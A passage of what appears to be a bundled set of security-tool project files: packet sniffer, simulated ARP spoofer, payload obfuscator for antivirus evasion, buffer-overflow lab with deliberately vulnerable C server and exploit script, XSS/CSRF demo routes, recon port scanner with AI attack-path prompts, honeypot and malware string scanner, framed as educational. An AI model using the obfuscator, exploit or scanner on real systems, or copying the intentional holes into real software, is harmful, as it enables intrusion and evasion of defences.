      "compliance.py": `#!/usr/bin/env python3\nimport argparse, json, os\nfrom datetime import datetime\n\nSOC2_CONTROLS = [\n  {'id': 'CC1.1', 'category': 'COSO', 'control': 'Management demonstrates commitment to integrity and ethical values', 'evidence': 'Code of conduct, security policy'},\n  {'id': 'CC2.2', 'category': 'Communication', 'control': 'Internal communication of security objectives', 'evidence': 'Security training records, policy acknowledgements'},\n  {'id': 'CC6.1', 'category': 'Logical Access', 'control': 'Logical access security software implemented', 'evidence': 'MFA enforcement, access reviews'},\n  {'id': 'CC6.2', 'category': 'Logical Access', 'control': 'New internal credential provisioning restricted', 'evidence': 'Onboarding workflow, JIRA tickets'},\n  {'id': 'CC6.6', 'category': 'Logical Access', 'control': 'External access controls implemented', 'evidence': 'VPN logs, WAF rules'},\n  {'id': 'CC7.1', 'category': 'System Ops', 'control': 'Security vulnerabilities detected and monitored', 'evidence': 'Vulnerability scanner output, SIEM alerts'},\n  {'id': 'CC7.2', 'category': 'System Ops', 'control': 'Security incidents evaluated', 'evidence': 'Incident response records'},\n  {'id': 'CC8.1', 'category': 'Change Mgmt', 'control': 'Changes to infrastructure authorised and managed', 'evidence': 'Change request records, PR reviews'},\n  {'id': 'CC9.1', 'category': 'Risk Mitigation', 'control': 'Risk mitigation activities identified and applied', 'evidence': 'Risk register, risk review meetings'},\n]\n\nGDPR_ARTICLES = [\n  {'article': '5', 'title': 'Principles of data processing', 'check': 'Data minimisation and purpose limitation'},\n  {'article': '6', 'title': 'Lawful basis for processing', 'check': 'Documented legal basis for all processing activities'},\n  {'article': '13', 'title': 'Privacy notice', 'check': 'Privacy policy accessible at point of data collection'},\n  {'article': '17', 'title': 'Right to erasure', 'check': 'Data deletion mechanism implemented and tested'},\n  {'article': '25', 'title': 'Data protection by design', 'check': 'PIA conducted for new processing activities'},\n  {'article': '32', 'title': 'Security of processing', 'check': 'Encryption at rest and in transit, access controls'},\n  {'article': '33', 'title': 'Breach notification', 'check': 'Incident response procedure with 72h notification SLA'},\n  {'article': '37', 'title': 'Data Protection Officer', 'check': 'DPO appointed or documented rationale for not appointing'},\n]\n\ndef run_framework(framework: str) -> dict:\n    if framework == 'soc2':\n        items = [{'control': c, 'status': 'PENDING_EVIDENCE', 'notes': ''} for c in SOC2_CONTROLS]\n        title = 'SOC 2 Type II Control Mapping'\n    elif framework == 'gdpr':\n        items = [{'requirement': a, 'status': 'PENDING_REVIEW', 'notes': ''} for a in GDPR_ARTICLES]\n        title = 'GDPR Gap Analysis'\n    else:\n        items = []\n        title = framework\n    return {'framework': framework, 'title': title, 'generated_at': datetime.now().isoformat(),\n            'total_controls': len(items), 'items': items,\n            'instructions': 'Review each control, update status to COMPLIANT/NON_COMPLIANT/PARTIAL, add evidence links'}\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--framework', choices=['soc2','gdpr','iso27001'], required=True)\n    ap.add_argument('--output', default='compliance_report.json')\n    args = ap.parse_args()\n    result = run_framework(args.framework)\n    with open(args.output, 'w') as f: json.dump(result, f, indent=2)\n    print(f'[+] {result["title"]}: {result["total_controls"]} controls written to {args.output}')\n`,
    },

  
    // ── MITM Toolkit ─────────────────────────────────────────────────────────────
    "mitm-toolkit": {
      "README.md": `# Network Sniffing & MITM Toolkit\n\nMan-in-the-middle attack simulation and traffic analysis for authorised security testing.\n\n\`\`\`bash\npython3 mitm.py --interface eth0 --target 192.168.1.10 --gateway 192.168.1.1\npython3 sniffer.py --interface eth0 --filter 'tcp port 80'\n\`\`\`\n\n\n---\n## Legal Notice\nFor authorised security testing and educational use only. Authors accept no liability for misuse.\n`,
      "sniffer.py": `#!/usr/bin/env python3\nimport argparse\n\ndef sniff_packets(interface: str, pkt_filter: str = '', count: int = 100):\n    print(f'[*] Network Packet Sniffer — interface: {interface}')\n    print('[*] AUTHORISED USE ONLY — requires root/admin privileges and explicit permission')\n    try:\n        from scapy.all import sniff, IP, TCP, UDP, Raw\n        def pkt_handler(pkt):\n            if IP in pkt:\n                src, dst = pkt[IP].src, pkt[IP].dst\n                proto = 'TCP' if TCP in pkt else 'UDP' if UDP in pkt else 'OTHER'\n                payload = bytes(pkt[Raw]).decode('utf-8', errors='ignore')[:80] if Raw in pkt else ''\n                print(f'  [{proto}] {src} -> {dst}: {payload}')\n        print(f'[*] Sniffing {count} packets (filter: {pkt_filter or "none"})...')\n        sniff(iface=interface, filter=pkt_filter, prn=pkt_handler, count=count)\n    except ImportError:\n        print('[!] Install scapy: pip install scapy')\n    except PermissionError:\n        print('[!] Root/Administrator privileges required')\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--interface', required=True)\n    ap.add_argument('--filter', default='')\n    ap.add_argument('--count', type=int, default=100)\n    args = ap.parse_args()\n    sniff_packets(args.interface, args.filter, args.count)\n`,
      "mitm.py": `#!/usr/bin/env python3\nimport argparse, time\n\ndef arp_spoof_simulation(interface: str, target: str, gateway: str):\n    print(f'[*] ARP Spoofing Simulator (EDUCATIONAL)')\n    print(f'[*] Would spoof: target={target}, gateway={gateway} on {interface}')\n    print('[*] AUTHORISED USE ONLY — illegal without explicit permission')\n    print('[*] This is a simulation — no actual ARP packets sent')\n    print('[*] In a real scenario, this would:')\n    print('    1. Send ARP replies claiming to be the gateway to the target')\n    print('    2. Send ARP replies claiming to be the target to the gateway')\n    print('    3. Enable IP forwarding to pass traffic transparently')\n    print('    4. All target traffic would flow through the attacker machine')\n    print()\n    print('[*] Defences:')\n    print('    - Dynamic ARP Inspection (DAI) on managed switches')\n    print('    - Static ARP entries for critical hosts')\n    print('    - HTTPS everywhere (encrypts data even if intercepted)')\n    print('    - HSTS preloading')\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--interface', required=True)\n    ap.add_argument('--target', required=True)\n    ap.add_argument('--gateway', required=True)\n    args = ap.parse_args()\n    arp_spoof_simulation(args.interface, args.target, args.gateway)\n`,
      "requirements.txt": `scapy>=2.5.0\n`,
    },

    // ── AV Evasion Engine ─────────────────────────────────────────────────────────
    "av-evasion": {
      "README.md": `# Payload Obfuscation & AV Evasion Engine\n\nObfuscation techniques for red team payload testing and AV bypass research.\n\n\`\`\`bash\npython3 obfuscate.py --input payload.py --technique base64\npython3 obfuscate.py --input payload.ps1 --technique xor --key 0x42\n\`\`\`\n\n\n---\n## Legal Notice\nFor authorised security testing and educational use only. Authors accept no liability for misuse.\n`,
      "obfuscate.py": `#!/usr/bin/env python3\nimport argparse, base64, random, string\n\ndef encode_base64(data: bytes) -> str:\n    b64 = base64.b64encode(data).decode()\n    return f'import base64; exec(base64.b64decode(\"{b64}\").decode())'\n\ndef encode_xor(data: bytes, key: int = 0x42) -> str:\n    xored = bytes(b ^ key for b in data)\n    hex_payload = xored.hex()\n    return f'key={key}; data=bytes.fromhex(\"{hex_payload}\"); exec(bytes(b^key for b in data).decode())'\n\ndef encode_rot13(data: bytes) -> str:\n    import codecs\n    rot = codecs.encode(data.decode(), 'rot_13')\n    return f'import codecs; exec(codecs.decode(\"{rot}\", \'rot_13\'))'\n\ndef variable_substitution(code: str) -> str:\n    # Rename variables to random names\n    reserved = {'if','else','elif','for','while','def','class','import','from','return','try','except','with','as','pass','break','continue','and','or','not','in','is','True','False','None','print','exec','eval'}\n    words = set(w for w in code.split() if w.isidentifier() and w not in reserved)\n    mapping = {w: ''.join(random.choices(string.ascii_lowercase, k=8)) for w in words}\n    for orig, new in mapping.items(): code = code.replace(orig, new)\n    return code\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--input', required=True)\n    ap.add_argument('--technique', choices=['base64','xor','rot13','substitute'], required=True)\n    ap.add_argument('--key', type=lambda x: int(x, 0), default=0x42)\n    ap.add_argument('--output')\n    args = ap.parse_args()\n    with open(args.input, 'rb') as f: data = f.read()\n    if args.technique == 'base64': result = encode_base64(data)\n    elif args.technique == 'xor': result = encode_xor(data, args.key)\n    elif args.technique == 'rot13': result = encode_rot13(data)\n    elif args.technique == 'substitute': result = variable_substitution(data.decode())\n    out = args.output or args.input + '.obf.py'\n    with open(out, 'w') as f: f.write(result)\n    print(f'[+] Obfuscated payload written to {out}')\n`,
    },

    // ── Buffer Overflow Exploitation Lab ─────────────────────────────────────────
    "buffer-overflow-lab": {
      "README.md": `# Buffer Overflow Exploitation Lab\n\nHands-on buffer overflow exploitation exercises in isolated Docker containers.\n\n\`\`\`bash\ndocker-compose up\npython3 exploit.py --target localhost:9999 --offset 112\n\`\`\`\n\n\n---\n## Legal Notice\nFor authorised security testing and educational use only. Authors accept no liability for misuse.\n`,
      "vulnerable_server.c": `// EDUCATIONAL: Intentionally vulnerable server for buffer overflow practice\n// Compile: gcc -m32 -fno-stack-protector -no-pie -o vuln_server vulnerable_server.c\n// Run in Docker sandbox ONLY\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n\nvoid greet(char *name) {\n    char buffer[100];  // Intentionally small buffer\n    strcpy(buffer, name);  // No bounds check — intentional for lab\n    printf(\"Hello, %s!\\n\", buffer);\n}\n\nint main() {\n    // Start listening\n    int srv = socket(AF_INET, SOCK_STREAM, 0);\n    struct sockaddr_in addr = { .sin_family=AF_INET, .sin_port=htons(9999), .sin_addr.s_addr=INADDR_ANY };\n    bind(srv, (struct sockaddr*)&addr, sizeof(addr));\n    listen(srv, 5);\n    printf(\"[*] Vulnerable server listening on :9999 (EDUCATIONAL ONLY)\\n\");\n    while(1) {\n        int cli = accept(srv, NULL, NULL);\n        char input[512];\n        read(cli, input, 512);\n        greet(input);\n        close(cli);\n    }\n}\n`,
      "exploit.py": `#!/usr/bin/env python3\nimport argparse, socket\n\ndef find_offset(host: str, port: int) -> int:\n    \"\"\"Send cyclic pattern to find the EIP/RIP offset\"\"\"\n    import struct\n    # Cyclic pattern: De Bruijn sequence\n    def cyclic(n: int) -> bytes:\n        charset = b'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\n        pattern = bytearray()\n        for i in range(n): pattern.append(charset[(i % 26)])\n        return bytes(pattern)\n    payload = cyclic(200)\n    try:\n        with socket.create_connection((host, port), timeout=5) as s: s.send(payload)\n    except: pass\n    print(f'[*] Sent cyclic pattern. Check crash EIP/RIP to determine offset.')\n    return -1\n\ndef exploit(host: str, port: int, offset: int, ret_addr: bytes = b'\\x41\\x41\\x41\\x41'):\n    print(f'[*] Buffer Overflow Lab — {host}:{port}')\n    print('[*] EDUCATIONAL USE ONLY — run against lab environment')\n    nop_sled = b'\\x90' * 16\n    shellcode = b'\\x90' * 32  # NOP placeholder — replace with real shellcode for lab\n    padding = b'A' * offset\n    payload = padding + ret_addr + nop_sled + shellcode\n    print(f'[*] Payload: {len(payload)} bytes | offset: {offset} | ret: {ret_addr.hex()}')\n    try:\n        with socket.create_connection((host, port), timeout=5) as s:\n            s.send(payload)\n            print('[+] Payload sent')\n    except Exception as e: print(f'[!] {e}')\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--target', default='localhost:9999')\n    ap.add_argument('--offset', type=int, default=0)\n    ap.add_argument('--ret', default='41414141')\n    args = ap.parse_args()\n    host, port = args.target.split(':')\n    if args.offset: exploit(host, int(port), args.offset, bytes.fromhex(args.ret))\n    else: find_offset(host, int(port))\n`,
      "docker-compose.yml": `version: '3.8'\nservices:\n  lab:\n    build: .\n    ports:\n      - '9999:9999'\n    network_mode: bridge\n    mem_limit: 128m\n    cap_add: [SYS_PTRACE]\n    security_opt: [seccomp:unconfined]\n`,
      "Dockerfile": `FROM ubuntu:20.04\nRUN apt-get update && apt-get install -y gcc gcc-multilib python3 && rm -rf /var/lib/apt/lists/*\nWORKDIR /lab\nCOPY vulnerable_server.c .\nRUN gcc -m32 -fno-stack-protector -no-pie -o vuln_server vulnerable_server.c\nCMD [\"/lab/vuln_server\"]\n`,
    },

    // ── Cryptographic Attack Suite ────────────────────────────────────────────────
    "crypto-attacks": {
      "README.md": `# Cryptographic Attack Suite\n\nEducational demonstrations of cryptographic attacks: padding oracle, hash length extension, timing attacks.\n\n\`\`\`bash\npython3 crypto_attacks.py --attack padding-oracle --ciphertext DEADBEEF...\npython3 crypto_attacks.py --attack timing --url https://lab.example.com/login\n\`\`\`\n\n\n---\n## Legal Notice\nFor authorised security testing and educational use only. Authors accept no liability for misuse.\n`,
      "crypto_attacks.py": `#!/usr/bin/env python3\nimport argparse, time, hmac, hashlib\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad, unpad\nfrom Crypto import Random\n\ndef demo_padding_oracle_vulnerable():\n    \"\"\"Demonstrate a vulnerable padding oracle implementation\"\"\"\n    key = Random.new().read(16)\n    def encrypt(plaintext: bytes) -> tuple:\n        iv = Random.new().read(16)\n        cipher = AES.new(key, AES.MODE_CBC, iv)\n        return iv, cipher.encrypt(pad(plaintext, 16))\n    def decrypt_check_padding(iv: bytes, ciphertext: bytes) -> bool:\n        try:\n            cipher = AES.new(key, AES.MODE_CBC, iv)\n            unpad(cipher.decrypt(ciphertext), 16)\n            return True\n        except ValueError: return False\n    print('[*] Padding Oracle Demo:')\n    msg = b'SECRET DATA HERE'\n    iv, ct = encrypt(msg)\n    print(f'  Encrypted: {ct.hex()}')\n    print('  [!] A padding oracle allows decryption WITHOUT the key via ~128 queries per byte')\n    print('  Defence: Use authenticated encryption (AES-GCM) — never raw CBC')\n    return decrypt_check_padding\n\ndef demo_timing_attack():\n    \"\"\"Demonstrate timing side-channel in string comparison\"\"\"\n    secret = b'correct-password'\n    def vulnerable_compare(user_input: bytes) -> bool:\n        return user_input == secret  # Python == is constant time for bytes, but demos the concept\n    def safe_compare(user_input: bytes) -> bool:\n        return hmac.compare_digest(user_input, secret)\n    print('[*] Timing Attack Demo:')\n    print('  Vulnerable: direct == comparison (may leak length/prefix info)')\n    print('  Safe: hmac.compare_digest() — always constant-time')\n    test = b'wrong-password  '\n    t1 = time.perf_counter(); vulnerable_compare(test); t1 = time.perf_counter() - t1\n    t2 = time.perf_counter(); safe_compare(test); t2 = time.perf_counter() - t2\n    print(f'  Vulnerable: {t1*1e9:.1f}ns | Safe: {t2*1e9:.1f}ns')\n\ndef demo_hash_length_extension():\n    print('[*] Hash Length Extension Demo:')\n    print('  Vulnerable: MAC = MD5(secret + message)')\n    print('  Attack: Can append data and forge valid MAC without knowing secret')\n    print('  Defence: Use HMAC-SHA256 — prepend+append secret, not just prepend')\n    secret = b'secretkey'\n    message = b'amount=100'\n    naive_mac = hashlib.md5(secret + message).hexdigest()\n    hmac_mac = hmac.new(secret, message, hashlib.sha256).hexdigest()\n    print(f'  Naive MD5 MAC: {naive_mac}')\n    print(f'  Correct HMAC-SHA256: {hmac_mac}')\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--attack', choices=['padding-oracle','timing','hash-extension','all'], default='all')\n    args = ap.parse_args()\n    if args.attack in ('padding-oracle','all'): demo_padding_oracle_vulnerable()\n    if args.attack in ('timing','all'): demo_timing_attack()\n    if args.attack in ('hash-extension','all'): demo_hash_length_extension()\n`,
      "requirements.txt": `pycryptodome>=3.19.0\n`,
    },

    // ── HoneyNet — Deception Grid ─────────────────────────────────────────────────
    "honeynet": {
      "README.md": `# HoneyNet — Deception Grid for Attackers\n\nDeploy a network of honeypots that detect, log, and alert on attacker activity.\n\n\`\`\`bash\npython3 honeynet.py --mode ssh --port 2222 --webhook https://...\npython3 honeynet.py --mode http --port 8080\n\`\`\`\n`,
      "honeynet.py": `#!/usr/bin/env python3\nimport argparse, socket, threading, json, requests\nfrom datetime import datetime\n\ndef alert(event: dict, webhook: str = None):\n    print(f'[HONEYPOT ALERT] {json.dumps(event)}')\n    if webhook:\n        try: requests.post(webhook, json=event, timeout=5)\n        except: pass\n\ndef ssh_honeypot(port: int, webhook: str = None):\n    print(f'[*] SSH Honeypot on :{port}')\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    server.bind(('0.0.0.0', port))\n    server.listen(10)\n    def handle(conn, addr):\n        event = {'type': 'ssh_probe', 'src_ip': addr[0], 'src_port': addr[1], 'ts': datetime.now().isoformat()}\n        try:\n            conn.send(b'SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6\\r\\n')\n            data = conn.recv(1024)\n            event['banner_grab'] = data[:100].hex()\n        except: pass\n        finally: conn.close()\n        alert(event, webhook)\n    while True:\n        try:\n            conn, addr = server.accept()\n            threading.Thread(target=handle, args=(conn, addr), daemon=True).start()\n        except: break\n\ndef http_honeypot(port: int, webhook: str = None):\n    from http.server import HTTPServer, BaseHTTPRequestHandler\n    class HoneypotHandler(BaseHTTPRequestHandler):\n        def log_message(self, fmt, *args): pass\n        def do_GET(self):\n            event = {'type': 'http_probe', 'path': self.path, 'method': 'GET',\n                     'src': self.client_address[0], 'ua': self.headers.get('User-Agent',''),\n                     'ts': datetime.now().isoformat()}\n            alert(event, self.server.webhook)\n            self.send_response(200)\n            self.end_headers()\n            self.wfile.write(b'<html><body><h1>Welcome</h1></body></html>')\n        do_POST = do_GET\n    print(f'[*] HTTP Honeypot on :{port}')\n    srv = HTTPServer(('0.0.0.0', port), HoneypotHandler)\n    srv.webhook = webhook\n    srv.serve_forever()\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--mode', choices=['ssh','http'], required=True)\n    ap.add_argument('--port', type=int, required=True)\n    ap.add_argument('--webhook')\n    args = ap.parse_args()\n    if args.mode == 'ssh': ssh_honeypot(args.port, args.webhook)\n    elif args.mode == 'http': http_honeypot(args.port, args.webhook)\n`,
      "requirements.txt": `requests>=2.31.0\n`,
    },

    // ── ReconAI — AI-Powered Attack Surface Discovery ─────────────────────────────
    "recon-ai": {
      "README.md": `# ReconAI — AI-Powered Attack Surface Discovery\n\nUses AI to analyse recon data and identify the most promising attack paths.\n\n\`\`\`bash\npython3 recon_ai.py --target example.com --openai-key YOUR_KEY\n\`\`\`\n\n\n---\n## Legal Notice\nFor authorised security testing and educational use only. Authors accept no liability for misuse.\n`,
      "recon_ai.py": `#!/usr/bin/env python3\nimport argparse, subprocess, json, socket\nfrom datetime import datetime\n\ndef collect_recon_data(target: str) -> dict:\n    data = {'target': target, 'subdomains': [], 'open_ports': [], 'tech_stack': [], 'emails': []}\n    # Basic subdomain enumeration\n    common_subs = ['www','api','app','admin','dev','staging','mail','vpn','cdn']\n    for sub in common_subs:\n        host = f'{sub}.{target}'\n        try:\n            ip = socket.gethostbyname(host)\n            data['subdomains'].append({'host': host, 'ip': ip})\n        except: pass\n    # Port scan on primary domain\n    primary_ip = None\n    try: primary_ip = socket.gethostbyname(target)\n    except: pass\n    if primary_ip:\n        for port in [80, 443, 22, 21, 25, 3306, 5432, 6379, 27017, 8080, 8443]:\n            try:\n                with socket.create_connection((primary_ip, port), timeout=0.5): data['open_ports'].append(port)\n            except: pass\n    return data\n\ndef ai_analyse(recon_data: dict, openai_key: str) -> str:\n    try:\n        import openai\n        client = openai.OpenAI(api_key=openai_key)\n        prompt = f\"\"\"You are a senior penetration tester. Analyse this recon data and:\n1. Identify the top 3 most promising attack vectors\n2. Suggest specific tools/techniques for each vector\n3. Estimate the likelihood of success\n4. Note any interesting findings\n\nRecon Data:\n{json.dumps(recon_data, indent=2)}\n\nProvide a structured analysis. AUTHORISED TESTING CONTEXT ONLY.\"\"\"\"\n        response = client.chat.completions.create(\n            model='gpt-4o-mini',\n            messages=[{'role': 'user', 'content': prompt}],\n            max_tokens=1500\n        )\n        return response.choices[0].message.content\n    except ImportError: return '[!] Install openai: pip install openai'\n    except Exception as e: return f'[!] AI analysis failed: {e}'\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--target', required=True)\n    ap.add_argument('--openai-key')\n    ap.add_argument('--output', default='recon_report.json')\n    args = ap.parse_args()\n    print(f'[*] ReconAI — Target: {args.target}')\n    print('[*] AUTHORISED USE ONLY')\n    data = collect_recon_data(args.target)\n    analysis = ai_analyse(data, args.openai_key) if args.openai_key else '[AI analysis disabled — provide --openai-key]'\n    report = {'recon': data, 'ai_analysis': analysis, 'timestamp': datetime.now().isoformat()}\n    with open(args.output, 'w') as f: json.dump(report, f, indent=2)\n    print(f'[+] Recon complete. {len(data["subdomains"])} subdomains, {len(data["open_ports"])} open ports')\n    print(f'[+] Report: {args.output}')\n`,
      "requirements.txt": `openai>=1.10.0\nrequests>=2.31.0\n`,
    },

  
    // ── BrowserPwn — In-Browser Exploitation Lab ─────────────────────────────────
    "browser-pwn": {
      "README.md": `# BrowserPwn — In-Browser Exploitation Lab\n\nInteractive lab teaching browser security vulnerabilities: XSS, CSRF, clickjacking, prototype pollution.\n\n\`\`\`bash\nnpm install && npm run dev\n# Navigate to http://localhost:3000\n\`\`\`\n\n\n---\n## Legal Notice\nFor authorised security testing and educational use only. Authors accept no liability for misuse.\n`,
      "server.ts": `import express from 'express';\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\napp.use(express.static('public'));\n\n// Intentionally vulnerable routes for education\napp.get('/xss', (req, res) => {\n  const name = req.query.name as string ?? '';\n  // VULNERABLE: reflects user input without escaping\n  res.send(\`<html><body><h1>Hello \${name}!</h1><p>This page is intentionally vulnerable to XSS for educational purposes.</p><p>Try: ?name=&lt;img src=x onerror=alert(1)&gt;</p></body></html>\`);\n});\n\napp.get('/xss-safe', (req, res) => {\n  const name = (req.query.name as string ?? '').replace(/[<>&\"']/g, c => ({ '<':'&lt;', '>':'&gt;', '&':'&amp;', '\"':'&quot;', \"'\": '&#x27;' }[c]!));\n  res.send(\`<html><body><h1>Hello \${name}!</h1><p>This version properly escapes the input.</p></body></html>\`);\n});\n\napp.get('/clickjacking', (req, res) => {\n  // Missing X-Frame-Options — vulnerable to clickjacking\n  res.send('<html><body><h1>Clickjacking Demo</h1><p>This page has no X-Frame-Options header. It can be embedded in an iframe.</p></body></html>');\n});\n\napp.get('/csrf-form', (req, res) => {\n  res.send('<html><body><form method=POST action=/csrf-action><input name=amount value=1000><button>Transfer</button></form></body></html>');\n});\n\napp.post('/csrf-action', (req, res) => {\n  res.json({ message: \`CSRF Demo: Would transfer \${req.body.amount} without token check\` });\n});\n\napp.get('/', (req, res) => {\n  res.send(\'<html><body><h1>BrowserPwn Lab</h1><ul><li><a href=/xss>XSS Demo</a></li><li><a href=/xss-safe>XSS Fixed</a></li><li><a href=/clickjacking>Clickjacking</a></li><li><a href=/csrf-form>CSRF</a></li></ul></body></html>\');\n});\n\napp.listen(3000, () => console.log('[BrowserPwn] Lab running on http://localhost:3000'));\n`,
      "package.json": `{\n  \"name\": \"browser-pwn\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": { \"express\": \"^4.18.0\" }\n}\n`,
    },

    // ── MalDNA — Malware Behaviour Fingerprinting Engine ─────────────────────────
    "mal-dna": {
      "README.md": `# MalDNA — Malware Behaviour Fingerprinting Engine\n\nBehavioural analysis and fingerprinting of malware samples in isolated sandboxes.\n\n\`\`\`bash\npython3 mal_dna.py --sample suspicious.exe --mode static\npython3 mal_dna.py --sample suspicious.py --mode dynamic --sandbox docker\n\`\`\`\n\n\n---\n## Legal Notice\nFor authorised security testing and educational use only. Authors accept no liability for misuse.\n`,
      "mal_dna.py": `#!/usr/bin/env python3\nimport argparse, hashlib, json, re, subprocess\nfrom pathlib import Path\nfrom datetime import datetime\n\nSUSPICIOUS_STRINGS = [\n    (rb'CreateRemoteThread', 'Process injection technique'),\n    (rb'VirtualAllocEx', 'Memory allocation in remote process'),\n    (rb'WriteProcessMemory', 'Writing to remote process memory'),\n    (rb'WinExec|ShellExecute|CreateProcess', 'Code execution'),\n    (rb'socket|connect|recv|send', 'Network communication'),\n    (rb'RegOpenKey|RegSetValue', 'Registry manipulation'),\n    (rb'GetProcAddress|LoadLibrary', 'Dynamic import resolution'),\n    (rb'base64|b64decode', 'Encoded payload'),\n    (rb'bitcoin|monero|wallet', 'Cryptocurrency references'),\n    (rb'/bin/sh|/bin/bash|cmd\\.exe|powershell', 'Shell invocation'),\n]\n\ndef static_analysis(sample_path: str) -> dict:\n    path = Path(sample_path)\n    if not path.exists(): return {'error': f'File not found: {sample_path}'}\n    data = path.read_bytes()\n    hashes = {\n        'md5': hashlib.md5(data).hexdigest(),\n        'sha1': hashlib.sha1(data).hexdigest(),\n        'sha256': hashlib.sha256(data).hexdigest(),\n    }\n    # String analysis\n    findings = []\n    for pattern, desc in SUSPICIOUS_STRINGS:\n        if re.search(pattern, data, re.IGNORECASE):\n            findings.append({'indicator': pattern.decode('utf-8', errors='replace'), 'description': desc})\n    # Entropy analysis (high entropy = possible packing/encryption)\n    entropy = -sum((data.count(b) / len(data)) * __import__('math').log2(data.count(b) / len(data))\n                   for b in set(data) if data.count(b) > 0)\n    return {'file': str(path), 'size': len(data), 'hashes': hashes,\n            'entropy': round(entropy, 3), 'high_entropy': entropy > 7.0,\n            'suspicious_indicators': findings, 'indicator_count': len(findings)}\n\ndef dynamic_analysis_sim(sample_path: str) -> dict:\n    print('[*] Dynamic Analysis (Simulation)')\n    print('[*] In production, this runs the sample in an isolated Docker/VM sandbox')\n    return {\n        'mode': 'simulation',\n        'note': 'Full dynamic analysis requires a dedicated sandbox VM',\n        'would_monitor': ['file system writes', 'registry modifications', 'network connections',\n                          'process creation', 'memory allocation', 'API calls'],\n    }\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--sample', required=True)\n    ap.add_argument('--mode', choices=['static','dynamic'], default='static')\n    ap.add_argument('--output', default='maldna_report.json')\n    args = ap.parse_args()\n    if args.mode == 'static': result = static_analysis(args.sample)\n    else: result = {**static_analysis(args.sample), **dynamic_analysis_sim(args.sample)}\n    result['timestamp'] = datetime.now().isoformat()\n    with open(args.output, 'w') as f: json.dump(result, f, indent=2)\n    print(f'[+] MalDNA Report: {args.output}')\n    print(f'[+] SHA256: {result.get("hashes",{}).get("sha256","N/A")}')\n    print(f'[+] Suspicious indicators: {result.get("indicator_count",0)}')\n    if result.get('high_entropy'): print(f'[!] HIGH ENTROPY ({result["entropy"]}) — possible packing/encryption')\n`,
    },

    // ── AI Code Review Agent ────────────────────────────────────────────────────
    "ai-code-review": {
      "README.md": `# AI Code Review Agent\n\nAutomated code review using AI — finds bugs, security issues, and code quality problems in PRs.\n\n\`\`\`bash\nnpm install && npm run review -- --pr 123 --repo owner/repo\n# Or as a GitHub Action (see .github/workflows/ai-review.yml)\n\`\`\`\n`,
      "reviewer.ts": `import { Octokit } from '@octokit/rest';\nimport OpenAI from 'openai';\n\nconst octokit = new Octokit({ auth: process.env.GITHUB_TOKEN });\nconst ai = new OpenAI({ apiKey: process.env.OPENAI_API_KEY });\n\nasync function getPRDiff(owner: string, repo: string, pullNumber: number): Promise<string> {\n  const { data } = await octokit.pulls.get({ owner, repo, pull_number: pullNumber, mediaType: { format: 'diff' } });\n  return data as unknown as string;\n}\n\nasync function reviewCode(diff: string): Promise<string> {\n  const prompt = \`You are a senior software engineer performing a code review. Analyse this git diff and provide:\n1. Security vulnerabilities (with severity: Critical/High/Medium/Low)\n2. Bugs and logic errors\n3. Performance issues\n4. Code quality improvements\n5. A summary with an overall assessment\n\nBe specific: reference line numbers where visible.\n\nDiff:\n\${diff.slice(0, 8000)}\`;\n  const response = await ai.chat.completions.create({\n    model: 'gpt-4o-mini',\n    messages: [{ role: 'user', content: prompt }],\n    max_tokens: 2000,\n  });\n  return response.choices[0].message.content ?? 'No review generated';\n}\n\nasync function postReviewComment(owner: string, repo: string, pullNumber: number, body: string) {\n  await octokit.issues.createComment({ owner, repo, issue_number: pullNumber, body: \`## AI Code Review\\n\\n\${body}\` });\n}\n\nexport async function main() {\n  const args = process.argv.slice(2);\n  const prArg = args.find(a => a.startsWith('--pr='))?.replace('--pr=', '') ?? args[args.indexOf('--pr') + 1];\n  const repoArg = args.find(a => a.startsWith('--repo='))?.replace('--repo=', '') ?? args[args.indexOf('--repo') + 1];\n  if (!prArg || !repoArg) { console.error('Usage: --repo owner/repo --pr 123'); process.exit(1); }\n  const [owner, repo] = repoArg.split('/');\n  const pullNumber = parseInt(prArg);\n  console.log(\`[AI Review] Reviewing PR #\${pullNumber} in \${repoArg}\`);\n  const diff = await getPRDiff(owner, repo, pullNumber);\n  const review = await reviewCode(diff);\n  console.log('\\n--- AI REVIEW ---');\n  console.log(review);\n  if (process.env.POST_COMMENT === 'true') {\n    await postReviewComment(owner, repo, pullNumber, review);\n    console.log('\\n[+] Review comment posted to PR');\n  }\n}\n\nmain().catch(console.error);\n`,
      ".github/workflows/ai-review.yml": `name: AI Code Review\non:\n  pull_request:\n    types: [opened, synchronize]\njobs:\n  review:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n      - run: npm install\n      - run: npx tsx reviewer.ts --repo \${{ github.repository }} --pr \${{ github.event.pull_request.number }}\n        env:\n          GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}\n          OPENAI_API_KEY: \${{ secrets.OPENAI_API_KEY }}\n          POST_COMMENT: 'true'\n`,
      "package.json": `{\n  \"name\": \"ai-code-review\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": { \"@octokit/rest\": \"^20.0.0\", \"openai\": \"^4.0.0\", \"tsx\": \"^4.0.0\" }\n}\n`,
    },

    // ── SecureCI — Security Gate for Every Pull Request ──────────────────────────
    "secure-ci": {
